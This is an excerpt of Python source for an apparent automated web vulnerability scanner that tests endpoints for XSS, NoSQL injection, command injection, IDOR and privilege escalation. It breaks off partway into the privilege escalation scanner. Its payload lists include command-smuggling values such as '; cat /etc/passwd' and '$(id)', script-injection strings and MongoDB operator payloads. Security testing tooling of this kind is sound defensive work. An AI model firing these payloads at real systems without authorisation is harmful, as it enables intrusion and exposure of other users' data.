                "XSS: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(payloads_to_test),
            )

            found_vuln = False

            for payload_dict in payloads_to_test:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
                if not payload_str:
                    continue

                payload_hash = hashlib.md5(payload_str.encode()).hexdigest()[:8]
                if self._is_tested(target.url, category, param_name, payload_hash):
                    continue

                resp = await self._send_payload(target, param_name, param_location, payload_str, param_value)

                self._mark_tested(target.url, category, param_name, payload_hash)
                self._update_progress(category, target.url)

                if not resp:
                    continue

                result = TestResult(
                    target=target,
                    category=category,
                    payload=payload_str,
                    parameter=param_name,
                    request_url=target.url,
                    request_method=target.method,
                    response_status=resp.status_code,
                    response_body=resp.text[:2000] if resp.text else "",
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                )

                # Programmatic check
                is_vuln, confidence, evidence = self._check_xss_programmatic(resp, baseline, payload_str)

                if is_vuln:
                    result.is_vulnerable = True
                    result.confidence = confidence
                    result.evidence = evidence

                    if confidence in (Confidence.CONFIRMED, Confidence.HIGH):
                        result.severity = Severity.HIGH
                    else:
                        result.severity = Severity.MEDIUM

                    result.poc = self._generate_poc(target, category, param_name, param_location, payload_str, resp)

                    # AI confirmation
                    if self.use_ai and confidence in (Confidence.CONFIRMED, Confidence.HIGH):
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, payload_str, resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln:
                            result.confidence = Confidence.CONFIRMED

                    self._record_finding(result)
                    found_vuln = True

                elif self.use_ai:
                    # Check if payload appears anywhere in response (might need AI)
                    if payload_str in (resp.text or ""):
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, payload_str, resp, baseline,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln:
                            result.is_vulnerable = True
                            result.confidence = ai_conf
                            result.evidence = ai_text
                            result.severity = Severity.MEDIUM
                            result.poc = self._generate_poc(target, category, param_name, param_location, payload_str, resp)
                            self._record_finding(result)
                            found_vuln = True

                self._all_results.append(result)

            # === DOM-based XSS check via browser ===
            if not found_vuln and not self._cancelled:
                dom_result = await self._test_dom_xss(target, param_name, param_location, baseline)
                if dom_result and dom_result.is_vulnerable:
                    results.append(dom_result)
                    self._record_finding(dom_result)
                    found_vuln = True

            # === Stored XSS check ===
            if not found_vuln and not self._cancelled and target.method in ("POST", "PUT", "PATCH"):
                stored_result = await self._test_stored_xss(target, param_name, param_location, param_value, baseline)
                if stored_result and stored_result.is_vulnerable:
                    results.append(stored_result)
                    self._record_finding(stored_result)
                    found_vuln = True

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "payloads_tested": len(payloads_to_test),
                "vulnerable": found_vuln,
            })

        return results

    async def _test_dom_xss(
        self,
        target: ScanTarget,
        param_name: str,
        param_location: str,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Test for DOM-based XSS by injecting payloads and using
        the headless browser to check if they execute.
        """
        dom_payloads = [
            '<img src=x onerror="window.__xss_triggered=true">',
            '<svg onload="window.__xss_triggered=true">',
            '"><img src=x onerror="window.__xss_triggered=true">',
            "';window.__xss_triggered=true;//",
        ]

        for payload_str in dom_payloads:
            if self._cancelled:
                break

            try:
                # Build URL with payload
                if param_location == "query":
                    parsed = urlparse(target.url)
                    params = dict(target.params) if target.params else {}
                    params[param_name] = payload_str
                    test_url = f"{target.url}?{urlencode(params)}"
                else:
                    continue  # DOM XSS primarily via URL params

                # Navigate with browser
                page_data = await self.browser.navigate(test_url, wait_for="networkidle")

                # Check if XSS triggered
                xss_triggered = await self.browser.execute_js("window.__xss_triggered === true")

                if xss_triggered:
                    evidence = f"DOM-based XSS confirmed: payload executed in browser context"

                    result = TestResult(
                        target=target,
                        category=ScanCategory.XSS,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=test_url,
                        request_method="GET",
                        response_status=200,
                        response_body=page_data.html[:1000] if page_data and page_data.html else "",
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = f"# DOM-based XSS\n# Open in browser:\n{test_url}"

                    self._all_results.append(result)
                    self._update_progress(ScanCategory.XSS, target.url)
                    return result

            except Exception as exc:
                logger.debug("DOM XSS test error: %s", str(exc))

            self._update_progress(ScanCategory.XSS, target.url)

        return None

    async def _test_stored_xss(
        self,
        target: ScanTarget,
        param_name: str,
        param_location: str,
        original_value: str,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Test for stored XSS: inject payload via POST, then check
        if it appears on subsequent GET requests.
        """
        unique_marker = f"xss_{hashlib.md5(f'{target.url}{param_name}{time.time()}'.encode()).hexdigest()[:8]}"
        stored_payloads = [
            f'<script>document.title="{unique_marker}"</script>',
            f'<img src=x onerror="document.title=\'{unique_marker}\'">',
            f'{unique_marker}<script>alert(1)</script>',
        ]

        for payload_str in stored_payloads:
            if self._cancelled:
                break

            try:
                # Submit payload
                resp = await self._send_payload(target, param_name, param_location, payload_str, original_value)
                self._update_progress(ScanCategory.XSS, target.url)

                if not resp or resp.status_code >= 400:
                    continue

                # Wait briefly for storage
                await asyncio.sleep(0.5)

                # Fetch the page again to see if payload is stored
                check_resp = await self._send_raw_request("GET", target.url)
                self._update_progress(ScanCategory.XSS, target.url)

                if check_resp and unique_marker in (check_resp.text or ""):
                    # Check if the full payload (with script tags) is present
                    full_reflected = payload_str in (check_resp.text or "")

                    evidence = f"Stored XSS: marker '{unique_marker}' found in response after POST injection"
                    if full_reflected:
                        evidence += " — full payload reflected without encoding"

                    result = TestResult(
                        target=target,
                        category=ScanCategory.XSS,
                        payload=payload_str,
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=check_resp.status_code,
                        response_body=check_resp.text[:1000] if check_resp.text else "",
                        is_vulnerable=True,
                        confidence=Confidence.CONFIRMED if full_reflected else Confidence.HIGH,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(target, ScanCategory.XSS, param_name, param_location, payload_str, resp)
                    result.poc += f"\n\n# Stored XSS — payload persists across requests\n# Marker: {unique_marker}"

                    self._all_results.append(result)
                    return result

            except Exception as exc:
                logger.debug("Stored XSS test error: %s", str(exc))

        return None

    # =================================================================
    # NoSQL INJECTION SCANNER
    # =================================================================

    async def _scan_nosql(self, target: ScanTarget) -> List[TestResult]:
        """
        Test a single endpoint for NoSQL injection vulnerabilities.
        Focuses on MongoDB operator injection ($gt, $ne, $regex, etc.).
        """
        results: List[TestResult] = []
        category = ScanCategory.NOSQL
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            context = self._build_payload_context(target, param_name)
            payloads_raw = self.payloads.get_payloads("nosql", context)
            payloads_to_test = payloads_raw[:self.max_payloads]

            logger.info(
                "NoSQL: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(payloads_to_test),
            )

            found_vuln = False

            for payload_dict in payloads_to_test:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_str = payload_dict.get("payload", "") if isinstance(payload_dict, dict) else str(payload_dict)
                if not payload_str:
                    continue

                payload_hash = hashlib.md5(payload_str.encode()).hexdigest()[:8]
                if self._is_tested(target.url, category, param_name, payload_hash):
                    continue

                # For NoSQL, we often need to send JSON objects
                # Try to parse payload as JSON
                actual_payload: Any = payload_str
                is_json_payload = False
                try:
                    parsed_payload = json.loads(payload_str)
                    actual_payload = parsed_payload
                    is_json_payload = True
                except (json.JSONDecodeError, TypeError):
                    pass

                if is_json_payload and param_location == "body":
                    # Inject JSON object into body parameter
                    modified_body = dict(target.body) if target.body else {}
                    modified_body[param_name] = actual_payload
                    resp = await self._send_raw_request(
                        method=target.method,
                        url=target.url,
                        json_data=modified_body,
                    )
                elif is_json_payload and param_location == "query":
                    # Some APIs accept JSON in query params
                    modified_params = dict(target.params) if target.params else {}
                    modified_params[param_name] = payload_str
                    resp = await self._send_raw_request(
                        method=target.method,
                        url=target.url,
                        params=modified_params,
                    )
                else:
                    resp = await self._send_payload(target, param_name, param_location, payload_str, param_value)

                self._mark_tested(target.url, category, param_name, payload_hash)
                self._update_progress(category, target.url)

                if not resp:
                    continue

                result = TestResult(
                    target=target,
                    category=category,
                    payload=payload_str,
                    parameter=param_name,
                    request_url=target.url,
                    request_method=target.method,
                    response_status=resp.status_code,
                    response_body=resp.text[:2000] if resp.text else "",
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                )

                is_vuln, confidence, evidence = self._check_nosql_programmatic(resp, baseline, payload_str)

                if is_vuln:
                    result.is_vulnerable = True
                    result.confidence = confidence
                    result.evidence = evidence
                    result.severity = Severity.CRITICAL if confidence in (Confidence.CONFIRMED, Confidence.HIGH) else Severity.HIGH
                    result.poc = self._generate_poc(target, category, param_name, param_location, payload_str, resp)

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, payload_str, resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text

                    self._record_finding(result)
                    found_vuln = True

                self._all_results.append(result)

            # Also test with operator injection in full body
            if not found_vuln and not self._cancelled and target.method in ("POST", "PUT", "PATCH"):
                nosql_body_result = await self._test_nosql_operator_injection(target, baseline)
                if nosql_body_result and nosql_body_result.is_vulnerable:
                    results.append(nosql_body_result)
                    self._record_finding(nosql_body_result)
                    found_vuln = True

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "vulnerable": found_vuln,
            })

        return results

    async def _test_nosql_operator_injection(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> Optional[TestResult]:
        """
        Test NoSQL operator injection by replacing entire
        field values with MongoDB operators.
        """
        if not target.body or not isinstance(target.body, dict):
            return None

        operator_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$ne": 1},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$exists": True},
            {"$in": ["admin", "user", "root"]},
        ]

        for param_name in target.body:
            if self._cancelled:
                break

            for op_payload in operator_payloads:
                if self._cancelled:
                    break

                modified_body = dict(target.body)
                modified_body[param_name] = op_payload

                resp = await self._send_raw_request(
                    method=target.method,
                    url=target.url,
                    json_data=modified_body,
                )
                self._update_progress(ScanCategory.NOSQL, target.url)

                if not resp:
                    continue

                is_vuln, confidence, evidence = self._check_nosql_programmatic(resp, baseline, json.dumps(op_payload))

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.NOSQL,
                        payload=json.dumps({param_name: op_payload}),
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        request_body=modified_body,
                        response_status=resp.status_code,
                        response_body=resp.text[:1000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.CRITICAL,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{json.dumps(modified_body)}'"
                    )
                    if self._auth_token:
                        result.poc = result.poc.replace(
                            f"'{target.url}'",
                            f"'{target.url}' -H 'Authorization: Bearer {self._auth_token}'"
                        )

                    self._all_results.append(result)
                    return result

        return None

    # =================================================================
    # COMMAND INJECTION SCANNER
    # =================================================================

    async def _scan_cmd_injection(self, target: ScanTarget) -> List[TestResult]:
        """
        Test a single endpoint for OS command injection.
        Uses various separators and command payloads.
        """
        results: List[TestResult] = []
        category = ScanCategory.CMD_INJECTION
        baseline = self._get_baseline(target)
        parameters = self._get_all_parameters(target)

        if not parameters:
            return results

        # Command injection payloads — manual list for precise control
        cmd_payloads = [
            # Unix command separators
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            # Windows
            "& dir",
            "| dir",
            "& whoami",
            # Time-based
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "| ping -c 5 127.0.0.1",
            # File read
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            # Encoded variants
            "%3B+id",
            "%7C+id",
            "%26+id",
            # Newline-based
            "\nid",
            "\r\nid",
            "%0Aid",
            "%0D%0Aid",
        ]

        for param_name, (param_value, param_location) in parameters.items():
            if self._cancelled:
                break

            if self._is_tested(target.url, category, param_name):
                continue

            logger.info(
                "CMD Injection: Testing %s param='%s' with %d payloads",
                target.url, param_name, len(cmd_payloads),
            )

            found_vuln = False

            for payload_str in cmd_payloads:
                if self._cancelled:
                    break
                if found_vuln and not self.aggressive:
                    break

                payload_hash = hashlib.md5(payload_str.encode()).hexdigest()[:8]
                if self._is_tested(target.url, category, param_name, payload_hash):
                    continue

                full_payload = f"{param_value}{payload_str}"

                resp = await self._send_payload(target, param_name, param_location, full_payload, param_value)

                self._mark_tested(target.url, category, param_name, payload_hash)
                self._update_progress(category, target.url)

                if not resp:
                    # Check if timeout indicates sleep worked
                    continue

                result = TestResult(
                    target=target,
                    category=category,
                    payload=full_payload,
                    parameter=param_name,
                    request_url=target.url,
                    request_method=target.method,
                    response_status=resp.status_code,
                    response_body=resp.text[:2000] if resp.text else "",
                    response_time=resp.response_time,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                    baseline_time=baseline.response_time,
                )

                is_vuln, confidence, evidence = self._check_cmdi_programmatic(resp, baseline, payload_str)

                if is_vuln:
                    result.is_vulnerable = True
                    result.confidence = confidence
                    result.evidence = evidence
                    result.severity = Severity.CRITICAL
                    result.poc = self._generate_poc(target, category, param_name, param_location, full_payload, resp)

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, full_payload, resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln and ai_conf in (Confidence.CONFIRMED, Confidence.HIGH):
                            result.confidence = Confidence.CONFIRMED

                    self._record_finding(result)
                    found_vuln = True

                elif self.use_ai:
                    # Check for subtle indicators
                    if baseline.captured and (
                        resp.status_code != baseline.status_code
                        or resp.response_time > baseline.response_time + 3
                    ):
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            category, target, param_name, full_payload, resp, baseline,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln:
                            result.is_vulnerable = True
                            result.confidence = ai_conf
                            result.evidence = ai_text
                            result.severity = Severity.CRITICAL
                            result.poc = self._generate_poc(target, category, param_name, param_location, full_payload, resp)
                            self._record_finding(result)
                            found_vuln = True

                self._all_results.append(result)

            self.state.mark_endpoint_tested(target.url, category.value, {
                "parameter": param_name,
                "vulnerable": found_vuln,
            })

        return results
    
        # =================================================================
    # IDOR / ACCESS CONTROL SCANNER
    # =================================================================

    async def _scan_idor(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for Insecure Direct Object Reference (IDOR) by:
        1. Changing numeric/UUID IDs in path and parameters.
        2. Accessing other users' resources with current auth.
        3. Horizontal and vertical privilege escalation via IDOR.
        """
        results: List[TestResult] = []
        category = ScanCategory.IDOR
        baseline = self._get_baseline(target)

        if self._is_tested(target.url, category):
            return results

        # We need authentication for IDOR testing
        if not self._auth_token and not self._auth_cookies:
            logger.debug("IDOR: Skipping %s — no auth available", target.url)
            return results

        found_vuln = False

        # === Strategy 1: Path-based IDOR ===
        path_results = await self._test_path_idor(target, baseline)
        for r in path_results:
            if r.is_vulnerable:
                results.append(r)
                self._record_finding(r)
                found_vuln = True

        # === Strategy 2: Parameter-based IDOR ===
        param_results = await self._test_param_idor(target, baseline)
        for r in param_results:
            if r.is_vulnerable:
                results.append(r)
                self._record_finding(r)
                found_vuln = True

        # === Strategy 3: Body-based IDOR (for POST/PUT) ===
        if target.method in ("POST", "PUT", "PATCH"):
            body_results = await self._test_body_idor(target, baseline)
            for r in body_results:
                if r.is_vulnerable:
                    results.append(r)
                    self._record_finding(r)
                    found_vuln = True

        self.state.mark_endpoint_tested(target.url, category.value, {
            "vulnerable": found_vuln,
        })

        return results

    async def _test_path_idor(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> List[TestResult]:
        """
        Test IDOR by changing numeric/UUID IDs in the URL path.
        Example: /api/users/5 → /api/users/1, /api/users/2, etc.
        """
        results: List[TestResult] = []
        parsed = urlparse(target.url)
        path_parts = parsed.path.strip("/").split("/")

        # Find parts that look like IDs
        id_positions: List[Tuple[int, str]] = []
        for i, part in enumerate(path_parts):
            if part.isdigit():
                id_positions.append((i, part))
            elif re.match(r"^[a-f0-9]{24}$", part):
                # MongoDB ObjectId
                id_positions.append((i, part))
            elif re.match(
                r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
                part,
                re.IGNORECASE,
            ):
                # UUID
                id_positions.append((i, part))

        if not id_positions:
            return results

        for pos, original_id in id_positions:
            if self._cancelled:
                break

            # Generate alternative IDs to test
            test_ids = self._generate_idor_ids(original_id)

            for test_id in test_ids:
                if self._cancelled:
                    break

                # Build modified URL
                modified_parts = list(path_parts)
                modified_parts[pos] = str(test_id)
                modified_path = "/" + "/".join(modified_parts)
                modified_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    modified_path,
                    parsed.params,
                    parsed.query,
                    parsed.fragment,
                ))

                resp = await self._send_raw_request(
                    method=target.method,
                    url=modified_url,
                    params=target.params if target.params else None,
                    json_data=target.body,
                )
                self._update_progress(ScanCategory.IDOR, target.url)

                if not resp:
                    continue

                is_vuln, confidence, evidence = self._check_idor_programmatic(
                    resp, baseline, original_id, str(test_id), modified_url,
                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.IDOR,
                        payload=str(test_id),
                        parameter=f"__path_{pos}__",
                        request_url=modified_url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, ScanCategory.IDOR,
                        f"__path_{pos}__", "path",
                        str(test_id), resp,
                    )
                    result.poc += (
                        f"\n\n# IDOR: Changed ID from {original_id} to {test_id} in URL path"
                        f"\n# Original: {target.url}"
                        f"\n# Modified: {modified_url}"
                    )

                    # AI confirmation
                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            ScanCategory.IDOR, target, f"path_id_{pos}",
                            str(test_id), resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text
                        if ai_vuln and ai_conf in (Confidence.CONFIRMED, Confidence.HIGH):
                            result.confidence = Confidence.CONFIRMED

                    results.append(result)
                    self._all_results.append(result)
                    break  # One IDOR per position is enough

                self._all_results.append(TestResult(
                    target=target,
                    category=ScanCategory.IDOR,
                    payload=str(test_id),
                    parameter=f"__path_{pos}__",
                    request_url=modified_url,
                    request_method=target.method,
                    response_status=resp.status_code,
                    response_size=resp.content_length,
                    baseline_status=baseline.status_code,
                    baseline_size=baseline.content_length,
                ))

        return results

    async def _test_param_idor(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> List[TestResult]:
        """
        Test IDOR by changing ID values in query parameters.
        Example: ?userId=5 → ?userId=1
        """
        results: List[TestResult] = []
        params = target.params if target.params else {}

        # Find parameters that look like IDs
        id_params: Dict[str, str] = {}
        id_param_patterns = [
            r".*id$", r".*Id$", r".*ID$", r".*_id$",
            r"^id$", r"^user$", r"^uid$", r"^account$",
            r"^basket$", r"^order$", r"^profile$",
            r"^num$", r"^number$", r"^no$",
        ]

        for param_name, param_value in params.items():
            param_val_str = str(param_value)
            # Check if the value looks like an ID
            is_id_value = (
                param_val_str.isdigit()
                or re.match(r"^[a-f0-9]{24}$", param_val_str)
                or re.match(
                    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
                    param_val_str,
                    re.IGNORECASE,
                )
            )
            # Check if parameter name suggests it's an ID
            is_id_name = any(
                re.match(p, param_name, re.IGNORECASE)
                for p in id_param_patterns
            )

            if is_id_value or is_id_name:
                id_params[param_name] = param_val_str

        if not id_params:
            return results

        for param_name, original_value in id_params.items():
            if self._cancelled:
                break

            test_ids = self._generate_idor_ids(original_value)

            for test_id in test_ids:
                if self._cancelled:
                    break

                resp = await self._send_payload(
                    target, param_name, "query", str(test_id), original_value,
                )
                self._update_progress(ScanCategory.IDOR, target.url)

                if not resp:
                    continue

                is_vuln, confidence, evidence = self._check_idor_programmatic(
                    resp, baseline, original_value, str(test_id), target.url,
                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.IDOR,
                        payload=str(test_id),
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = self._generate_poc(
                        target, ScanCategory.IDOR, param_name,
                        "query", str(test_id), resp,
                    )
                    result.poc += (
                        f"\n\n# IDOR: Changed {param_name} from {original_value} to {test_id}"
                    )

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            ScanCategory.IDOR, target, param_name,
                            str(test_id), resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text

                    results.append(result)
                    self._all_results.append(result)
                    break

        return results

    async def _test_body_idor(
        self,
        target: ScanTarget,
        baseline: BaselineResponse,
    ) -> List[TestResult]:
        """
        Test IDOR by changing ID values in request body.
        Example: {"userId": 5} → {"userId": 1}
        """
        results: List[TestResult] = []

        if not target.body or not isinstance(target.body, dict):
            return results

        id_param_patterns = [
            r".*id$", r".*Id$", r".*ID$", r".*_id$",
            r"^id$", r"^user$", r"^uid$", r"^account$",
            r"^basket$", r"^order$", r"^profile$",
            r"^userId$", r"^user_id$", r"^basketId$",
        ]

        for param_name, param_value in target.body.items():
            if self._cancelled:
                break

            param_val_str = str(param_value)

            is_id_value = (
                param_val_str.isdigit()
                or re.match(r"^[a-f0-9]{24}$", param_val_str)
                or re.match(
                    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
                    param_val_str,
                    re.IGNORECASE,
                )
            )
            is_id_name = any(
                re.match(p, param_name, re.IGNORECASE) for p in id_param_patterns
            )

            if not (is_id_value or is_id_name):
                continue

            test_ids = self._generate_idor_ids(param_val_str)

            for test_id in test_ids:
                if self._cancelled:
                    break

                modified_body = dict(target.body)
                modified_body[param_name] = test_id if isinstance(param_value, int) and isinstance(test_id, int) else str(test_id)

                resp = await self._send_raw_request(
                    method=target.method,
                    url=target.url,
                    params=target.params if target.params else None,
                    json_data=modified_body,
                )
                self._update_progress(ScanCategory.IDOR, target.url)

                if not resp:
                    continue

                is_vuln, confidence, evidence = self._check_idor_programmatic(
                    resp, baseline, param_val_str, str(test_id), target.url,
                )

                if is_vuln:
                    result = TestResult(
                        target=target,
                        category=ScanCategory.IDOR,
                        payload=str(test_id),
                        parameter=param_name,
                        request_url=target.url,
                        request_method=target.method,
                        request_body=modified_body,
                        response_status=resp.status_code,
                        response_body=resp.text[:2000] if resp.text else "",
                        response_time=resp.response_time,
                        response_size=resp.content_length,
                        baseline_status=baseline.status_code,
                        baseline_size=baseline.content_length,
                        is_vulnerable=True,
                        confidence=confidence,
                        severity=Severity.HIGH,
                        evidence=evidence,
                    )
                    result.poc = (
                        f"curl -X {target.method} '{target.url}' "
                        f"-H 'Content-Type: application/json' "
                    )
                    if self._auth_token:
                        result.poc += f"-H 'Authorization: Bearer {self._auth_token}' "
                    result.poc += f"-d '{json.dumps(modified_body)}'"
                    result.poc += (
                        f"\n\n# IDOR: Changed {param_name} from {param_val_str} to {test_id} in request body"
                    )

                    if self.use_ai:
                        ai_vuln, ai_conf, ai_text = await self._ai_analyze_response(
                            ScanCategory.IDOR, target, param_name,
                            str(test_id), resp, baseline, evidence,
                        )
                        result.ai_analysis = ai_text

                    results.append(result)
                    self._all_results.append(result)
                    break

        return results

    def _generate_idor_ids(self, original_id: str) -> List[Any]:
        """
        Generate a list of alternative IDs to test for IDOR.
        Supports numeric, MongoDB ObjectId, and UUID formats.
        """
        test_ids: List[Any] = []

        if original_id.isdigit():
            original_int = int(original_id)
            # Test nearby IDs
            for offset in [1, 2, 3, -1, 0]:
                candidate = original_int + offset
                if candidate != original_int and candidate >= 0:
                    test_ids.append(candidate)
            # Test common IDs
            for common_id in [1, 2, 3, 5, 10, 100]:
                if common_id != original_int and common_id not in test_ids:
                    test_ids.append(common_id)

        elif re.match(r"^[a-f0-9]{24}$", original_id):
            # MongoDB ObjectId — change last few chars
            base = original_id[:20]
            for suffix in ["0001", "0002", "0003", "ffff", "0000"]:
                candidate = base + suffix
                if candidate != original_id:
                    test_ids.append(candidate)

        elif re.match(
            r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
            original_id,
            re.IGNORECASE,
        ):
            # UUID — change last segment
            parts = original_id.split("-")
            for suffix in ["000000000001", "000000000002", "000000000003"]:
                parts_copy = list(parts)
                parts_copy[-1] = suffix
                candidate = "-".join(parts_copy)
                if candidate != original_id:
                    test_ids.append(candidate)
        else:
            # String ID — try common alternatives
            for alt in ["admin", "1", "2", "test", "user", "guest"]:
                if alt != original_id:
                    test_ids.append(alt)

        return test_ids[:MAX_IDOR_ENUM]

    def _check_idor_programmatic(
        self,
        response: SmartResponse,
        baseline: BaselineResponse,
        original_id: str,
        test_id: str,
        url: str,
    ) -> Tuple[bool, Confidence, str]:
        """
        Programmatic check for IDOR.
        Key indicators:
        - 200 OK with different data (not 403/404)
        - Response contains data belonging to another user/entity
        - Different content than baseline
        """
        evidence_parts: List[str] = []
        confidence = Confidence.TENTATIVE
        is_vuln = False

        # 1. Got 200 with data (resource exists and is accessible)
        if response.status_code == 200 and response.content_length > 50:
            # Check if response has different data than baseline
            resp_hash = hashlib.md5(
                response.text.encode("utf-8", errors="replace")
            ).hexdigest() if response.text else ""

            if baseline.captured and baseline.body_hash:
                if resp_hash != baseline.body_hash:
                    evidence_parts.append(
                        f"Different data returned for ID={test_id} vs ID={original_id} "
                        f"(response hash differs)"
                    )
                    is_vuln = True
                    confidence = Confidence.HIGH
                else:
                    # Same data — might be same object, not IDOR
                    pass
            else:
                # No baseline, but got 200 with data
                evidence_parts.append(
                    f"Successfully accessed resource with ID={test_id} (status 200, {response.content_length} bytes)"
                )
                is_vuln = True
                confidence = Confidence.MEDIUM

        # 2. Check if response contains other user's data
        if response.is_json and response.json_data:
            data = response.json_data
            data_str = json.dumps(data).lower()

            # Check for user-specific fields that shouldn't be accessible
            sensitive_fields = [
                "email", "password", "token", "secret",
                "address", "phone", "credit", "card",
                "ssn", "social", "private",
            ]
            found_sensitive = []
            for field_name in sensitive_fields:
                if field_name in data_str:
                    found_sensitive.append(field_name)

            if found_sensitive and is_vuln:
                evidence_parts.append(
                    f"Response contains sensitive fields: {', '.join(found_sensitive)}"
                )
                confidence = Confidence.CONFIRMED

            # Check if test_id appears in response (confirming different entity)
            if str(test_id) in data_str and str(original_id) not in data_str:
                evidence_parts.append(
                    f"Response contains test ID={test_id} but not original ID={original_id}"
                )
                if is_vuln:
                    confidence = Confidence.CONFIRMED

        # 3. Not a 403/404 — access control not enforced
        if response.status_code == 200:
            # Expected: 403 (forbidden) or 404 (not found for wrong ID)
            evidence_parts.append(
                f"No access control: ID changed from {original_id} to {test_id}, "
                f"got HTTP {response.status_code}"
            )

        # 4. Got 403/404 — access control IS enforced (not vulnerable)
        if response.status_code in (403, 404, 401):
            return False, Confidence.TENTATIVE, ""

        evidence = " | ".join(evidence_parts) if evidence_parts else ""
        return is_vuln, confidence, evidence

    # =================================================================
    # PRIVILEGE ESCALATION SCANNER
    # =================================================================

    async def _scan_privilege_escalation(self, target: ScanTarget) -> List[TestResult]:
        """
        Test for vertical privilege escalation:
        1. Access admin endpoints with regular user token.
        2. Modify user role in requests.
        3. Access privileged functionality.
        """
        results: List[TestResult] = []
        category = ScanCategory.PRIVILEGE_ESCALATION
        baseline = self._get_baseline(target)

        if self._is_tested(target.url, category):
            return results

        if not self._auth_token and not self._auth_cookies:
            logger.debug("PrivEsc: Skipping %s — no auth available", target.url)
            return results

        found_vuln = False

        # === Strategy 1: Access admin-like endpoints with regular token ===
        admin_indicators = [
            "admin", "administrator", "manage", "management",
            "dashboard", "panel", "control", "superuser",
            "privilege", "role", "permission",
        ]
        url_lower = target.url.lower()
        is_admin_endpoint = any(ind in url_lower for ind in admin_indicators)

        if is_admin_endpoint:
            resp = await self._send_raw_request(
                method=target.method,
                url=target.url,
                params=target.params if target.params else None,
                json_data=target.body,
            )
            self._update_progress(category, target.url)

